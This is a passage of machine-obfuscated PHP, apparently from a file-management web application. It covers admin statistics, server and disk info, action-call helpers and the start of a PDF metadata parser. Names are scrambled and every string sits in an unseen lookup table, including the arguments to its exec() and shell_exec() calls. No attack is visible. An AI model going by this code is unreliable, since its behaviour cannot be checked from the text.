$b˜©òŸ‚âÃ[$cØÎ¢Ê‚‡×[2028]] = $b˜©òŸ‚âÃ[$cØÎ¢Ê‚‡×[2029]] = 0; } } $fÔœñÎ–Ğà[] = $b˜©òŸ‚âÃ; } $f–ÍŒ…¢Ì = $fÔœñÎ–Ğà; } $Dƒ·ÔƒÛÉà = array($cØÎ¢Ê‚‡×[535] => array($cØÎ¢Ê‚‡×[698] => LNG($cØÎ¢Ê‚‡×[2044]), $cØÎ¢Ê‚‡×[2028] => LNG($cØÎ¢Ê‚‡×[2045]), $cØÎ¢Ê‚‡×[2029] => LNG($cØÎ¢Ê‚‡×[2046])), $cØÎ¢Ê‚‡×[2030] => array($cØÎ¢Ê‚‡×[696] => LNG($cØÎ¢Ê‚‡×[2047]), $cØÎ¢Ê‚‡×[2032] => LNG($cØÎ¢Ê‚‡×[2048]), $cØÎ¢Ê‚‡×[2033] => LNG($cØÎ¢Ê‚‡×[2049]), $cØÎ¢Ê‚‡×[2034] => LNG($cØÎ¢Ê‚‡×[2050]))); $b£òÁ²¦„ = array($cØÎ¢Ê‚‡×[535] => $cØÎ¢Ê‚‡×[2051], $cØÎ¢Ê‚‡×[2030] => $cØÎ¢Ê‚‡×[77]); goto eø¤ ¼¥À; b¤­ŞèÄÖÒ: return $bÅÁìçùŠ¯; goto aÖğƒ˜ÌÂ¶; eø¤ ¼¥À: if (empty($f–ÍŒ…¢Ì)) { $aÑà¤²¬ƒª = date($cØÎ¢Ê‚‡×[2035], strtotime($cØÎ¢Ê‚‡×[2036])); $Fãù¡–Úƒ = array($cØÎ¢Ê‚‡×[210] => $aÑà¤²¬ƒª); foreach ($Dƒ·ÔƒÛÉà[$bòâÁšœ] as $fÄé¡ä‹Ôê => $FŠî­ÅÙå¸) { $Fãù¡–Úƒ[$fÄé¡ä‹Ôê] = 0; } $f–ÍŒ…¢Ì[] = $Fãù¡–Úƒ; } $bÅÁìçùŠ¯ = array(); foreach ($f–ÍŒ…¢Ì as $FŠî­ÅÙå¸) { if ($bòâÁšœ == $cØÎ¢Ê‚‡×[2030] && $FŠî­ÅÙå¸[$cØÎ¢Ê‚‡×[2032]] > $FŠî­ÅÙå¸[$cØÎ¢Ê‚‡×[696]]) { $FŠî­ÅÙå¸[$cØÎ¢Ê‚‡×[2032]] = $FŠî­ÅÙå¸[$cØÎ¢Ê‚‡×[696]]; } foreach ($Dƒ·ÔƒÛÉà[$bòâÁšœ] as $fÄé¡ä‹Ôê => $a©ŠêĞ±•‘) { $b˜©òŸ‚âÃ = array($cØÎ¢Ê‚‡×[210] => $FŠî­ÅÙå¸[$cØÎ¢Ê‚‡×[210]], $cØÎ¢Ê‚‡×[1340] => $a©ŠêĞ±•‘); $b˜©òŸ‚âÃ[$b£òÁ²¦„[$bòâÁšœ]] = isset($FŠî­ÅÙå¸[$fÄé¡ä‹Ôê]) ? $FŠî­ÅÙå¸[$fÄé¡ä‹Ôê] : 0; $bÅÁìçùŠ¯[] = $b˜©òŸ‚âÃ; } } goto b¤­ŞèÄÖÒ; aÖğƒ˜ÌÂ¶: } public function validDate($Cà†º®ˆ, $Cé–Ã²êëÂ) { goto f‹¨¿æ›Ó; EŠë¨¬„¥İ: switch ($Cà†º®ˆ) { case $Eó¾¦ëãÈ«[1416]: $b¦ë‡¾á•ˆ = mktime(0, 0, 0, date($Eó¾¦ëãÈ«[2052]), date($Eó¾¦ëãÈ«[2053]) - date($Eó¾¦ëãÈ«[1225]) + 7 - 7, date($Eó¾¦ëãÈ«[2054])); $f¦¦õŒ£ƒ = 0; do { $f¯±èí¾¡Ç = date($Eó¾¦ëãÈ«[2035], $b¦ë‡¾á•ˆ - 3600 * 24 * 7 * $f¦¦õŒ£ƒ); $DŠô…°Ù‡‘[] = $f¯±èí¾¡Ç; $f¦¦õŒ£ƒ++; } while ($Cé–Ã²êëÂ < $f¯±èí¾¡Ç); break; case $Eó¾¦ëãÈ«[1414]: $f¦¦õŒ£ƒ = 1; do { $E·‹È¯³— = date($Eó¾¦ëãÈ«[2055], strtotime("\x2d\x20{$f¦¦õŒ£ƒ}\x20\x6d\x6f\156\164\x68\x73")); $DŠô…°Ù‡‘[] = $E·‹È¯³—; $f¦¦õŒ£ƒ++; } while ($Cé–Ã²êëÂ < $E·‹È¯³—); break; case $Eó¾¦ëãÈ«[1723]: $eÕ’ï‚„ó = (int) date($Eó¾¦ëãÈ«[2054], strtotime($Cé–Ã²êëÂ)); $d¦ŠŸÎ¶¦‘ = (int) date($Eó¾¦ëãÈ«[2054]); if ($eÕ’ï‚„ó >= $d¦ŠŸÎ¶¦‘) { break; } for ($eÕ’ï‚„ó; $eÕ’ï‚„ó < $d¦ŠŸÎ¶¦‘; $eÕ’ï‚„ó++) { $DŠô…°Ù‡‘[] = $eÕ’ï‚„ó . $Eó¾¦ëãÈ«[2056]; } break; default: break; } if ($Cé–Ã²êëÂ > end($DŠô…°Ù‡‘)) { array_pop($DŠô…°Ù‡‘); } sort($DŠô…°Ù‡‘); goto eÒõÂ¸È¥õ; eÒõÂ¸È¥õ: return $DŠô…°Ù‡‘; goto eøİßÅ§Õ; f‹¨¿æ›Ó: $Eó¾¦ëãÈ« =& $_SERVER[Æ]; $eˆËĞ®Ì­í = date($Eó¾¦ëãÈ«[2035], strtotime($Eó¾¦ëãÈ«[2036])); $DŠô…°Ù‡‘ = array($eˆËĞ®Ì­í); goto EŠë¨¬„¥İ; eøİßÅ§Õ: } public function listTable($CîÜ´ñ‘å) { $bÎ¹ÜëÆ³ = ucfirst($CîÜ´ñ‘å); return Model($bÎ¹ÜëÆ³)->listData(); } public function option($e‚°å¹ŞÉ) { $DÛ™Î‡Ùå× = $_SERVER[Æ][2057] . ucfirst($e‚°å¹ŞÉ); return $this->{$DÛ™Î‡Ùå×}(); } private function optionUser() { goto e­ˆÜ‹Ø‚; aº¿™¿‹¼Î: $c“âƒÃéÂë = Model($D½Õ±óß©[477])->where($C÷¤ÎĞÚ—)->count($D½Õ±óß©[1434]); return array($D½Õ±óß©[693] => (int) $cï¨İëĞî, $D½Õ±óß©[2061] => (int) ($cï¨İëĞî - $f°£âÓÆŠ¨), $D½Õ±óß©[2062] => (int) $f°£âÓÆŠ¨, $D½Õ±óß©[2063] => (int) $c“âƒÃéÂë, $D½Õ±óß©[2064] => $FÙ‡Î»Ş‚Ó); goto D¥ËïóŞŒª; e­ˆÜ‹Ø‚: $D½Õ±óß© =& $_SERVER[Æ]; $cï¨İëĞî = Model($D½Õ±óß©[477])->count($D½Õ±óß©[1434]); $f°£âÓÆŠ¨ = Model($D½Õ±óß©[477])->where($D½Õ±óß©[2058])->count($D½Õ±óß©[1434]); goto fäì×ÇÀ»ç; f´ë…ò˜ƒ¡: if (!$FÙ‡Î»Ş‚Ó) { $FÙ‡Î»Ş‚Ó = 1; } $eÖá¶‘ÉĞç = strtotime(date($D½Õ±óß©[2039])); $C÷¤ÎĞÚ— = array($D½Õ±óß©[2060] => array($D½Õ±óß©[929], $eÖá¶‘ÉĞç)); goto aº¿™¿‹¼Î; fäì×ÇÀ»ç: $eÖá¶‘ÉĞç = strtotime($D½Õ±óß©[2059]); $C÷¤ÎĞÚ— = array($D½Õ±óß©[2060] => array($D½Õ±óß©[929], $eÖá¶‘ÉĞç)); $FÙ‡Î»Ş‚Ó = (int) Model($D½Õ±óß©[477])->where($C÷¤ÎĞÚ—)->count($D½Õ±óß©[1434]); goto f´ë…ò˜ƒ¡; D¥ËïóŞŒª: } private function optionFile() { goto B¬‡À±; B¹¹ØÅ†²‹: $BÚÁ‡İÂ† = Model($BÙÃÅ‰†¥˜[751])->where($DÁ’ Â•øŠ)->sum($BÙÃÅ‰†¥˜[77]); $DÊŸèÈ­è— = Model($BÙÃÅ‰†¥˜[751])->where($DÁ’ Â•øŠ)->count($BÙÃÅ‰†¥˜[369]); return array($BÙÃÅ‰†¥˜[696] => $FšÑİùÆ‹Â, $BÙÃÅ‰†¥˜[2032] => $e©Âº­Şôß, $BÙÃÅ‰†¥˜[2065] => $FšÑİùÆ‹Â - $e©Âº­Şôß, $BÙÃÅ‰†¥˜[2066] => (int) $BÚÁ‡İÂ†, $BÙÃÅ‰†¥˜[698] => (int) $C÷ĞˆéÃ˜‚, $BÙÃÅ‰†¥˜[2067] => (int) $DÊŸèÈ­è—); goto bÌÔôª§±Ü; B¬‡À±: $BÙÃÅ‰†¥˜ =& $_SERVER[Æ]; $bÎØ¦Ã•¢¦ = $this->sourceSize(); $FšÑİùÆ‹Â = $bÎØ¦Ã•¢¦[$BÙÃÅ‰†¥˜[77]]; goto bÆ÷Ã¢‰; bÆ÷Ã¢‰: $e©Âº­Şôß = $bÎØ¦Ã•¢¦[$BÙÃÅ‰†¥˜[2032]]; $C÷ĞˆéÃ˜‚ = Model($BÙÃÅ‰†¥˜[751])->where(array($BÙÃÅ‰†¥˜[370] => 0))->count($BÙÃÅ‰†¥˜[369]); $DÁ’ Â•øŠ = array($BÙÃÅ‰†¥˜[370] => 0, $BÙÃÅ‰†¥˜[187] => array($BÙÃÅ‰†¥˜[929], strtotime(date($BÙÃÅ‰†¥˜[2039])))); goto B¹¹ØÅ†²‹; bÌÔôª§±Ü: } private function optionAccess() { $e¨ŸòÈ­÷­ =& $_SERVER[Æ]; return array($e¨ŸòÈ­÷­[693] => $this->typeLogCnt(), $e¨ŸòÈ­÷­[103] => $this->typeLogCnt($e¨ŸòÈ­÷­[103]), $e¨ŸòÈ­÷­[404] => $this->typeLogCnt($e¨ŸòÈ­÷­[404]), $e¨ŸòÈ­÷­[2068] => $this->typeLogCnt($e¨ŸòÈ­÷­[2068]), $e¨ŸòÈ­÷­[2069] => $this->typeLogCnt($e¨ŸòÈ­÷­[2069]), $e¨ŸòÈ­÷­[535] => $this->typeLogCnt($e¨ŸòÈ­÷­[33], $e¨ŸòÈ­÷­[2043])); } private function typeLogCnt($F½›§Òö©‡ = '', $F†çÇ¹¬Œ = "\151\x64") { goto eäˆî‹”Õ; AÓÇ¸Åì: $Bµ´ÊÛ¾ë = array($böŒˆÕ¬ó[187] => array($böŒˆÕ¬ó[929], $DÇƒíÓËÜé)); if ($F½›§Òö©‡) { $Bµ´ÊÛ¾ë[$böŒˆÕ¬ó[29]] = array($böŒˆÕ¬ó[7], $eç¯¼œŒ¦°[$F½›§Òö©‡]); } $Aùá†Ö¨Û‡ = Model($böŒˆÕ¬ó[2042])->where($Bµ´ÊÛ¾ë)->count($F†çÇ¹¬Œ); goto eã½á±ë”Ù; eã½á±ë”Ù: return (int) $Aùá†Ö¨Û‡; goto dŸ”§Âµ; eäˆî‹”Õ: $böŒˆÕ¬ó =& $_SERVER[Æ]; $eç¯¼œŒ¦° = array($böŒˆÕ¬ó[103] => array($böŒˆÕ¬ó[2070], $böŒˆÕ¬ó[2071]), $böŒˆÕ¬ó[404] => array($böŒˆÕ¬ó[2072], $böŒˆÕ¬ó[2073]), $böŒˆÕ¬ó[2068] => array($böŒˆÕ¬ó[2074], $böŒˆÕ¬ó[2075]), $böŒˆÕ¬ó[2069] => array($böŒˆÕ¬ó[2076], $böŒˆÕ¬ó[2077]), $böŒˆÕ¬ó[2078] => array($böŒˆÕ¬ó[2079], $böŒˆÕ¬ó[2080], $böŒˆÕ¬ó[2081])); $DÇƒíÓËÜé = strtotime(date($böŒˆÕ¬ó[2039])); goto AÓÇ¸Åì; dŸ”§Âµ: } private function optionServer() { goto dåŞÁ¯¤½; dåŞÁ¯¤½: $F•’äƒÔ¹ =& $_SERVER[Æ]; $Dß¸–Ã‚ĞÛ = $this->diskDriver(); $B¶Š‘ì‡–© = KodIO::defaultDriver(); goto EÓèïÊæÒ; EÓèïÊæÒ: $EĞ†Ê¹‰§ë = array($F•’äƒÔ¹[742] => $B¶Š‘ì‡–©[$F•’äƒÔ¹[367]]); $CÑôáƒê· = Model($F•’äƒÔ¹[422])->where($EĞ†Ê¹‰§ë)->sum($F•’äƒÔ¹[77]); $B¤¥šÆµ¦È = explode($F•’äƒÔ¹[50], $_SERVER[$F•’äƒÔ¹[139]]); goto Bù²®«ÈĞ; dÎŞ™åôÄÌ: if ($F¶ä‚‰½Ù == $F•’äƒÔ¹[722]) { $B¡ÆÔËà´¢ = explode($F•’äƒÔ¹[1076], $BòÄÛ¦Ô—´[$F•’äƒÔ¹[888]]); $F¶ä‚‰½Ù = $B¡ÆÔËà´¢[0]; } if ($F¶ä‚‰½Ù == $F•’äƒÔ¹[725] || $F¶ä‚‰½Ù == $F•’äƒÔ¹[726]) { $c½æ„˜Ò = Model()->db()->query($F•’äƒÔ¹[2082]); $DœÍ¯âÇ±™ = $c½æ„˜Ò[0] && isset($c½æ„˜Ò[0][$F•’äƒÔ¹[1339]]) ? $c½æ„˜Ò[0][$F•’äƒÔ¹[1339]] : 0; $F¶ä‚‰½Ù = $F•’äƒÔ¹[2083] . ($DœÍ¯âÇ±™ ? $F•’äƒÔ¹[8] . $DœÍ¯âÇ±™ : $F•’äƒÔ¹[33]); } $D©æ«Á°ä = $GLOBALS[$F•’äƒÔ¹[6]][$F•’äƒÔ¹[337]][$F•’äƒÔ¹[752]]; goto dòê˜ºõƒ; Bù²®«ÈĞ: $bˆèù§Î„ = $B¤¥šÆµ¦È[0]; $BòÄÛ¦Ô—´ = $GLOBALS[$F•’äƒÔ¹[6]][$F•’äƒÔ¹[17]]; $F¶ä‚‰½Ù = $BòÄÛ¦Ô—´[$F•’äƒÔ¹[889]]; goto dÎŞ™åôÄÌ; dòê˜ºõƒ: return array($F•’äƒÔ¹[2084] => $Dß¸–Ã‚ĞÛ ? $Dß¸–Ã‚ĞÛ[$F•’äƒÔ¹[2085]] : 0, $F•’äƒÔ¹[2086] => $Dß¸–Ã‚ĞÛ ? $Dß¸–Ã‚ĞÛ[$F•’äƒÔ¹[2087]] : 0, $F•’äƒÔ¹[2088] => (int) $B¶Š‘ì‡–©[$F•’äƒÔ¹[2085]] * 1024 * 1024 * 1024, $F•’äƒÔ¹[2089] => (int) $CÑôáƒê·, $F•’äƒÔ¹[2090] => ucfirst($bˆèù§Î„), $F•’äƒÔ¹[2091] => $F•’äƒÔ¹[2092] . PHP_VERSION, $F•’äƒÔ¹[2093] => phpBuild64() ? 64 : 32, $F•’äƒÔ¹[692] => str_replace($F•’äƒÔ¹[2094], $F•’äƒÔ¹[905], $F¶ä‚‰½Ù), $F•’äƒÔ¹[337] => ucfirst($D©æ«Á°ä), $F•’äƒÔ¹[28] => $_SERVER[$F•’äƒÔ¹[2095]]); goto E‡¸åÕÆÉ•; E‡¸åÕÆÉ•: } private function diskDriver() { goto c§š¸òÃÌ; F¤•”âË÷: $D‘¥ÌÆ÷ÈŞ = $DœÉ¦Ù–åí - @disk_free_space($FÑîŸ»ÂËñ); return array($b­ÁšÛ¬Ò[2085] => $DœÉ¦Ù–åí, $b­ÁšÛ¬Ò[2087] => $D‘¥ÌÆ÷ÈŞ); goto AÛè”—Ñéò; c§š¸òÃÌ: $b­ÁšÛ¬Ò =& $_SERVER[Æ]; $FÑîŸ»ÂËñ = $b­ÁšÛ¬Ò[8]; $A£ùÄ»Ëåõ = $GLOBALS[$b­ÁšÛ¬Ò[6]][$b­ÁšÛ¬Ò[2096]] == $b­ÁšÛ¬Ò[2097]; goto a¹‹ø×Ìº; a¹‹ø×Ìº: if ($A£ùÄ»Ëåõ) { $FÑîŸ»ÂËñ = $b­ÁšÛ¬Ò[2098]; if (function_exists($b­ÁšÛ¬Ò[2099])) { exec($b­ÁšÛ¬Ò[2100], $CÒºÁÁŠÓè); $FÑîŸ»ÂËñ = $CÒºÁÁŠÓè[1] . $b­ÁšÛ¬Ò[8]; } } if (!file_exists($FÑîŸ»ÂËñ)) { return; } $DœÉ¦Ù–åí = @disk_total_space($FÑîŸ»ÂËñ); goto F¤•”âË÷; AÛè”—Ñéò: } public function fileChart($F…ÒÁ™å) { goto E¤İ”‡˜ÁÑ; CŸ¼İµÏÑ: $dšˆƒ¸„İ = $this->sourceSize(); $eÑÁº†â‘° = array($dàÇÇ‰Èœ†[461] => 0, $dàÇÇ‰Èœ†[371] => 1); $D…ø¸ÁâÓî = Model($dàÇÇ‰Èœ†[751])->where($eÑÁº†â‘°)->sum($dàÇÇ‰Èœ†[77]); goto b£Òâ·†ªµ; E¤İ”‡˜ÁÑ: $dàÇÇ‰Èœ† =& $_SERVER[Æ]; if (isset($F…ÒÁ™å[$dàÇÇ‰Èœ†[1434]])) { return Model($dàÇÇ‰Èœ†[751])->userFileTypeProfile($F…ÒÁ™å[$dàÇÇ‰Èœ†[1434]]); } if (isset($F…ÒÁ™å[$dàÇÇ‰Èœ†[2101]])) { return Model($dàÇÇ‰Èœ†[751])->groupFileTypeProfile($F…ÒÁ™å[$dàÇÇ‰Èœ†[2101]]); } goto CŸ¼İµÏÑ; b£Òâ·†ªµ: $eÑÁº†â‘°[$dàÇÇ‰Èœ†[371]] = 2; $b…¢¨ Ñ‰· = Model($dàÇÇ‰Èœ†[751])->where($eÑÁº†â‘°)->sum($dàÇÇ‰Èœ†[77]); return array($dàÇÇ‰Èœ†[696] => $dšˆƒ¸„İ[$dàÇÇ‰Èœ†[77]], $dàÇÇ‰Èœ†[2032] => $dšˆƒ¸„İ[$dàÇÇ‰Èœ†[2032]], $dàÇÇ‰Èœ†[2033] => (int) $D…ø¸ÁâÓî, $dàÇÇ‰Èœ†[2034] => (int) $b…¢¨ Ñ‰·); goto C‚ßŞï‡…²; C‚ßŞï‡…²: } private function sourceSize() { $fÈô™˜ó¾Ó =& $_SERVER[Æ]; $CàâæŠ¥‰© = Model($fÈô™˜ó¾Ó[751])->where(array($fÈô™˜ó¾Ó[370] => 0))->sum($fÈô™˜ó¾Ó[77]); $a³œß²Î’É = Model($fÈô™˜ó¾Ó[422])->sum($fÈô™˜ó¾Ó[77]); if ($a³œß²Î’É > $CàâæŠ¥‰©) { $a³œß²Î’É = $CàâæŠ¥‰©; } return array($fÈô™˜ó¾Ó[77] => (int) $CàâæŠ¥‰©, $fÈô™˜ó¾Ó[2032] => (int) $a³œß²Î’É); } } goto fİßÆ«¼¸°; Cƒİ«Ã’ ñ: function ActionCall($FÂ¬ÓÊ š‹) { $fà÷â¯í×† = array_slice(func_get_args(), 1); return ActionApply($FÂ¬ÓÊ š‹, $fà÷â¯í×†); } function ActionCallApi($eøÈ•Áà, $eò§’äÄ = '') { goto AĞ‘½Ëœò; B‚©—Ø¦æ: $Eß‰†¬Œˆ = json_decode($CƒÎ®£—Ñ, !0); $AŠ‚´‚¼‰Ù = is_array($Eß‰†¬Œˆ) ? $Eß‰†¬Œˆ : array($a’œï Éµ[33] => null, $a’œï Éµ[34] => $CƒÎ®£—Ñ); if (!$Eß‰†¬Œˆ) { echo $CƒÎ®£—Ñ; } goto b¢ËÊÙ×è; D ‘ä‰à·¿: $e¦Ç·À‚ÍÈ = Action($a’œï Éµ[23])->accessToken(); $eøÈ•Áà = str_replace($a’œï Éµ[5], $a’œï Éµ[4], $eøÈ•Áà) . $a’œï Éµ[24] . $e¦Ç·À‚ÍÈ . $Bô°ù›ñ¬ó; $CƒÎ®£—Ñ = $a’œï Éµ[20]; goto Eá¼ùßŠ°•; b¢ËÊÙ×è: return $AŠ‚´‚¼‰Ù; goto FÜ‰Æ—éÉà; Eá¼ùßŠ°•: $e“‰ã­®£à = phpBinCommand(); if ($e“‰ã­®£à && function_exists($a’œï Éµ[25])) { $eÖ–‹˜ËÓ = $e“‰ã­®£à . $a’œï Éµ[26] . BASIC_PATH . $a’œï Éµ[27] . escapeshellarg($eøÈ•Áà); $CƒÎ®£—Ñ = shell_exec($eÖ–‹˜ËÓ); } if (!$CƒÎ®£—Ñ) { $BŞ÷ëŠåªŸ = stream_context_create(array($a’œï Éµ[28] => array($a’œï Éµ[29] => 20, $a’œï Éµ[30] => $a’œï Éµ[31]))); $CƒÎ®£—Ñ = file_get_contents(APP_HOST . $a’œï Éµ[32] . $eøÈ•Áà, !1, $BŞ÷ëŠåªŸ); } goto B‚©—Ø¦æ; AĞ‘½Ëœò: $a’œï Éµ =& $_SERVER[ş”]; $Bô°ù›ñ¬ó = $eò§’äÄ; if (is_array($eò§’äÄ)) { $Bô°ù›ñ¬ó = $a’œï Éµ[20]; foreach ($eò§’äÄ as $f‰‚Ö‘¾ ¿ => $cŠ©´˜ñâˆ) { $cŠ©´˜ñâˆ = is_array($cŠ©´˜ñâˆ) ? json_encode($cŠ©´˜ñâˆ) : $cŠ©´˜ñâˆ; $cŠ©´˜ñâˆ = is_bool($cŠ©´˜ñâˆ) ? intval($cŠ©´˜ñâˆ) : $cŠ©´˜ñâˆ; $Bô°ù›ñ¬ó .= $a’œï Éµ[21] . $f‰‚Ö‘¾ ¿ . $a’œï Éµ[22] . rawurlencode($cŠ©´˜ñâˆ); } } goto D ‘ä‰à·¿; FÜ‰Æ—éÉà: } function ActionCallHook($c×ßª¶¯ÏÜ) { goto dã¹éí; dã¹éí: $d¯ŠÜï¦é =& $_SERVER[ş”]; ob_start(); $fğÙà«š‰® = array_slice(func_get_args(), 1); goto EÛåïÇÇ²; FÔ¶±œï¤: $Bß»—ä—òÄ = $A“Œ¨ë¡Å ? json_decode($A“Œ¨ë¡Å, !0) : $Bß»—ä—òÄ; $GLOBALS[$d¯ŠÜï¦é[35]] = 0; return $Bß»—ä—òÄ; goto e¹ëˆ‚ºµ; EÛåïÇÇ²: $GLOBALS[$d¯ŠÜï¦é[35]] = 1; $Bß»—ä—òÄ = ActionApply($c×ßª¶¯ÏÜ, $fğÙà«š‰®); $A“Œ¨ë¡Å = ob_get_clean(); goto FÔ¶±œï¤; e¹ëˆ‚ºµ: } goto e¢ëÊ§ñèİ; d»îó¡É¶: class FileParsePdf { public static function parse($BÍ¬²êçÂ) { goto F”ÅÀ÷ŞóÎ; cÛ»¯ŠšÛ¹: preg_match_all($B¥ñ¤¶ˆß÷, $BâÚ¢ªä¶Õ[$Bá÷ÊªŠÙ‰[1530]], $FĞ§×æ â‘); if ($FĞ§×æ â‘[1] && $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1537]] < $FĞ§×æ â‘[1][0]) { $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1537]] = $FĞ§×æ â‘[1][0]; } preg_match_all($B¥ñ¤¶ˆß÷, $BâÚ¢ªä¶Õ[$Bá÷ÊªŠÙ‰[1531]], $FĞ§×æ â‘); goto dŠ¥§Ø¯‰; AÉ‘øÉœŸÑ: if ($E¬´Ö¾ÎîÇ) { $BÁÖ”£ˆé£ = $E¬´Ö¾ÎîÇ[$Bá÷ÊªŠÙ‰[1532]][$Bá÷ÊªŠÙ‰[1191]]; $Eô–Ã¬©³Å = self::getObjectValue($BâÚ¢ªä¶Õ, $E¬´Ö¾ÎîÇ, $BÁÖ”£ˆé£); } $Eô–Ã¬©³Å = is_array($Eô–Ã¬©³Å) ? $Eô–Ã¬©³Å : array(); $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1533]] = 0; goto aƒ¥˜­×Ğ; aƒ¥˜­×Ğ: $B¥ñ¤¶ˆß÷ = $Bá÷ÊªŠÙ‰[1534]; preg_match($B¥ñ¤¶ˆß÷, $BâÚ¢ªä¶Õ[$Bá÷ÊªŠÙ‰[1530]], $FĞ§×æ â‘); if (!$Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1533]] && count($FĞ§×æ â‘) == 5) { $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1533]] = $FĞ§×æ â‘[3]; $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1535]] = $FĞ§×æ â‘[4]; } goto Cº”ÀË‘†Î; A‰œ¸“ƒ®: if ($FĞ§×æ â‘) { $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1339]] = $FĞ§×æ â‘[1]; } $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1537]] = 0; $B¥ñ¤¶ˆß÷ = $Bá÷ÊªŠÙ‰[1538]; goto cÛ»¯ŠšÛ¹; dŠ¥§Ø¯‰: if ($FĞ§×æ â‘[1] && $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1537]] < $FĞ§×æ â‘[1][0]) { $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1537]] = $FĞ§×æ â‘[1][0]; } $Eô–Ã¬©³Å = self::parseInfoItem($Eô–Ã¬©³Å); return $Eô–Ã¬©³Å; goto fİÊ‹ÒÆâ; F”ÅÀ÷ŞóÎ: $Bá÷ÊªŠÙ‰ =& $_SERVER[Æ]; $EíŒ£Öô¹ = 32 * 1024; $BâÚ¢ªä¶Õ = array($Bá÷ÊªŠÙ‰[774] => fopen($BÍ¬²êçÂ, $Bá÷ÊªŠÙ‰[1169]), $Bá÷ÊªŠÙ‰[75] => $BÍ¬²êçÂ, $Bá÷ÊªŠÙ‰[77] => filesize($BÍ¬²êçÂ), $Bá÷ÊªŠÙ‰[1529] => $EíŒ£Öô¹); goto Aâ“´·˜áŒ; Cº”ÀË‘†Î: preg_match($B¥ñ¤¶ˆß÷, $BâÚ¢ªä¶Õ[$Bá÷ÊªŠÙ‰[1531]], $FĞ§×æ â‘); if (!$Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1533]] && count($FĞ§×æ â‘) == 5) { $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1533]] = $FĞ§×æ â‘[3]; $Eô–Ã¬©³Å[$Bá÷ÊªŠÙ‰[1535]] = $FĞ§×æ â‘[4]; } preg_match($Bá÷ÊªŠÙ‰[1536], $BâÚ¢ªä¶Õ[$Bá÷ÊªŠÙ‰[1530]], $FĞ§×æ â‘); goto A‰œ¸“ƒ®; Aâ“´·˜áŒ: $BâÚ¢ªä¶Õ[$Bá÷ÊªŠÙ‰[1530]] = StreamWrapperIO::read($BÍ¬²êçÂ, 0, $EíŒ£Öô¹); $BâÚ¢ªä¶Õ[$Bá÷ÊªŠÙ‰[1531]] = StreamWrapperIO::read($BÍ¬²êçÂ, $BâÚ¢ªä¶Õ[$Bá÷ÊªŠÙ‰[77]] - $EíŒ£Öô¹, $EíŒ£Öô¹); $E¬´Ö¾ÎîÇ = self::decodeXref($BâÚ¢ªä¶Õ); goto AÉ‘øÉœŸÑ; fİÊ‹ÒÆâ: } private static function parseInfoItem($Dø¼†êô¤œ) { $E¾²‰Ôøä =& $_SERVER[Æ]; if (!$Dø¼†êô¤œ) { return !1; } $e¨™ñéªö = array($E¾²‰Ôøä[1340] => array($E¾²‰Ôøä[1539], $E¾²‰Ôøä[33]), $E¾²‰Ôøä[1540] => array($E¾²‰Ôøä[1541], $E¾²‰Ôøä[33]), $E¾²‰Ôøä[187] => array($E¾²‰Ôøä[1542], $E¾²‰Ôøä[210]), $E¾²‰Ôøä[107] => array($E¾²‰Ôøä[1543], $E¾²‰Ôøä[210]), $E¾²‰Ôøä[1537] => array($E¾²‰Ôøä[1537], $E¾²‰Ôøä[276]), $E¾²‰Ôøä[1533] => array($E¾²‰Ôøä[1533], $E¾²‰Ôøä[276]), $E¾²‰Ôøä[1535] => array($E¾²‰Ôøä[1535], $E¾²‰Ôøä[276]), $E¾²‰Ôøä[1544] => array($E¾²‰Ôøä[1545], $E¾²‰Ôøä[33]), $E¾²‰Ôøä[1546] => array($E¾²‰Ôøä[1547], $E¾²‰Ôøä[33]), $E¾²‰Ôøä[1548] => array($E¾²‰Ôøä[1339], $E¾²‰Ôøä[33])); $c×‹¯¥Àšè = array(); foreach ($e¨™ñéªö as $eÀ¨„šé™ => $eŒ¦›Şš±´) { if (!isset($Dø¼†êô¤œ[$eŒ¦›Şš±´[0]])) { continue; } $E´¡ÒÜÉ‰ = $Dø¼†êô¤œ[$eŒ¦›Şš±´[0]]; if (!$E´¡ÒÜÉ‰ || is_array($E´¡ÒÜÉ‰)) { continue; } switch ($eŒ¦›Şš±´[1]) { case $E¾²‰Ôøä[276]: $E´¡ÒÜÉ‰ = intval($E´¡ÒÜÉ‰); break; case $E¾²‰Ôøä[210]: if (substr($E´¡ÒÜÉ‰, 0, 2) == $E¾²‰Ôøä[1549]) { $E´¡ÒÜÉ‰ = substr($E´¡ÒÜÉ‰, 2, 14); } if (strtotime($E´¡ÒÜÉ‰)) { $E´¡ÒÜÉ‰ = date($E¾²‰Ôøä[1550], strtotime($E´¡ÒÜÉ‰)); } break; } $c×‹¯¥Àšè[$eÀ¨„šé™] = $E´¡ÒÜÉ‰; } return $c×‹¯¥Àšè; } private static function decodeXref(&$D¹¥é¯Êƒ) { goto DÜÛŒ §¬ ; fëÆÛïˆÔ: $B¼®¡âéö = $BÄ®•Šø°™[1552]; if (!preg_match_all($B¼®¡âéö, $c—‹¿Ş°Ÿ, $Bê‚Üù§¯ø, PREG_SET_ORDER, 0)) { return !1; } $DÜŞºé¯ = intval($Bê‚Üù§¯ø[0][1]); goto FÉ•âõÚŸ; DÜÛŒ §¬ : $BÄ®•Šø°™ =& $_SERVER[Æ]; $c—‹¿Ş°Ÿ = $D¹¥é¯Êƒ[$BÄ®•Šø°™[1531]]; $bÓ‚æğï“î = array($BÄ®•Šø°™[1532] => array(), $BÄ®•Šø°™[1551] => array()); goto fëÆÛïˆÔ; FÉ•âõÚŸ: if ($D¹¥é¯Êƒ[$BÄ®•Šø°™[77]] - $DÜŞºé¯ > $D¹¥é¯Êƒ[$BÄ®•Šø°™[1529]]) { $EĞ¿Øñ»¶ó = 4 * $D¹¥é¯Êƒ[$BÄ®•Šø°™[1529]]; $D¹¥é¯Êƒ[$BÄ®•Šø°™[1529]] = $EĞ¿Øñ»¶ó; $D¹¥é¯Êƒ[$BÄ®•Šø°™[1530]] = StreamWrapperIO::read($D¹¥é¯Êƒ[$BÄ®•Šø°™[75]], 0, 